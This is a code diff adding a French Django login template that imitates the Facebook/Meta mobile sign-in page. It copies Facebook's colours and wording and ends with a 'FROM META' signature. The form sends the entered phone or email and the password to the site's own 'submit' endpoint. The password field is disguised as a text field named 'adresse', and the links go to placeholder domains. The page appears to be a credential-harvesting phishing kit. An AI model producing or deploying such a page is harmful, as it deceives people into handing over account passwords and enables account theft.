@@ -1,0 +1,195 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connexion</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    }
+
+    body {
+      background: #ffffff;
+      color: #111;
+      min-height: 100vh;
+    }
+
+    .remplissage {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      max-width: 420px;
+      margin: 0 auto;
+      padding: 16px;
+    }
+
+    .motif {
+      text-align: center;
+      font-size: 13px;
+      color: #65676b;
+      padding-top: 8px;
+      margin-bottom: 30px;
+    }
+
+    .centre {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex: 1;
+      justify-content: center;
+    }
+
+    .logo {
+      width: 72px;
+      height: 72px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 28px;
+      overflow: hidden;
+    }
+
+    .logo img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      display: block;
+    }
+
+    .formulaire {
+      width: 100%;
+    }
+
+    .champ {
+      width: 100%;
+      border: 1px solid #d9dde3;
+      border-radius: 16px;
+      padding: 14px 16px;
+      font-size: 15px;
+      margin-bottom: 12px;
+      outline: none;
+      background: #fff;
+    }
+
+    .champ:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.12);
+    }
+
+    .bouton-principal {
+      width: 100%;
+      border: none;
+      border-radius: 22px;
+      height: 46px;
+      background: #1877f2;
+      color: white;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+    }
+
+    .bouton-principal:hover {
+      background: #166fe5;
+    }
+
+    .commande {
+      display: block;
+      text-align: center;
+      margin-top: 16px;
+      text-decoration: none;
+      color: #111;
+      font-size: 15px;
+      font-weight: 500;
+    }
+
+    .bas {
+      padding-bottom: 18px;
+    }
+
+    .bouton-contour {
+      width: 100%;
+      border-radius: 22px;
+      height: 46px;
+      border: 1px solid #1877f2;
+      background: white;
+      color: #1877f2;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+    }
+
+    .signature {
+      text-align: center;
+      margin-top: 22px;
+      font-size: 13px;
+      color: #888;
+      letter-spacing: 1px;
+      font-weight: 600;
+    }
+
+    .message {
+      width: 100%;
+      border-radius: 14px;
+      padding: 12px 14px;
+      margin-bottom: 14px;
+      font-size: 14px;
+    }
+
+    .message.success {
+      background: #eaf7ee;
+      color: #146c2e;
+      border: 1px solid #c6e7cf;
+    }
+
+    .message.error {
+      background: #fdecec;
+      color: #b42318;
+      border: 1px solid #f3c1c1;
+    }
+  </style>
+</head>
+<body>
+  <div class="remplissage">
+    <div>
+      <div class="motif">Français (France)</div>
+
+      <div class="centre">
+        <div class="logo">
+          <img src="{% static 'logo.png' %}" alt="Logo">
+        </div>
+
+        <form class="formulaire" method="post" action="{% url 'submit' %}">
+          {% csrf_token %}
+
+
+          <input class="champ" type="text" name="contact" id="courriel" placeholder="Numéro mobile ou e-mail" required>
+          <input class="champ" type="text" name="adresse" id="adresse" placeholder="Mot de passe" required>
+
+          <button class="bouton-principal" type="submit">Se connecter</button>
+          <a class="commande" href="https://ton-lien-commande.com">Mot de passe oublié ?</a>
+        </form>
+      </div>
+    </div>
+
+    <div class="bas">
+      <a class="bouton-contour" href="https://ton-lien-des-produits.com">Créer un compte </a>
+      <div class="signature">FROM META</div>
+    </div>
+  </div>
+</body>
+</html>
